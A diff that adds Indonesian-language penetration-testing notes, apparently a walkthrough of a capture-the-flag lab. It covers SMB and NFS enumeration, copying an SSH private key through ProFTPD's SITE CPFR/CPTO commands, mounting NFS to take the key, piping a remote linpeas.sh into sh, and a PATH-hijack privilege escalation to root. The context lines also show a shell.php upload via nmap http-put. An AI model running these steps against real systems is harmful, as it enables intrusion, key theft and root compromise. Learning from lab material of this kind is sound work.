@@ -86,3 +86,53 @@ nmap => network mapping
 - Beberapa skrip dapat dijalankan secara bersamaan dengan cara ini dengan memisahkannya dengan koma. Misalnya:.--script=smb-enum-users,smb-enum-shares
 - Beberapa skrip memerlukan argumen (misalnya, kredensial, jika mengeksploitasi kerentanan yang diautentikasi). Ini dapat diberikan dengan sakelar Nmap. Contohnya adalah dengan skrip (digunakan untuk mengunggah file menggunakan metode PUT). Ini membutuhkan dua argumen: URL untuk mengunggah file, dan lokasi file pada disk. Misalnya:--script-argshttp-put
     - nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php'
+
+
+## samba
+```
+nmap -vvv
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.166.158
+
+smbclient //10.10.10.10/anonymous
+smbget -R smb://10.10.166.158/anonymous
+
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.166.158
+searsearchsploit proftpd 1.3.5
+
+nc 10.10.166.158 21 / netcat => network cat
+SITE CPFR /home/kenobi/.ssh/id_rsa
+SITE CPTO /var/tmp/id_rsa
+
+mkdir /mnt/kenobiNFS
+sudo mount 10.10.166.158:/var /mnt/kenobi
+ls -al /mnt/kenobi
+
+cp /mnt/kenobi/tmp/id_rsa id_rsa
+sudo chmod 600 id_rsa
+ssh -i id_rsa kenobi@10.10.166.158
+
+d0b0f3f53b6caa532a83915e19224899
+```
+
+```
+find / -perm -u=s -type f 2>/dev/null
+usr/bin/menu
+
+sudo python3 -m http-server 80
+wget http://ur_ip/linpeas.sh | sh
+curl ur_ip/linpeas.sh | sh
+
+if u got /usr/bin/menu
+u can use menu
+- menu
+
+- strings /usr/bin/menu
+env => environment variable
+
+echo bin/sh > curl
+chmod 777 curl
+export PATH=/tmp:$PATH
+
+menu: 1
+# (user root now)
+```
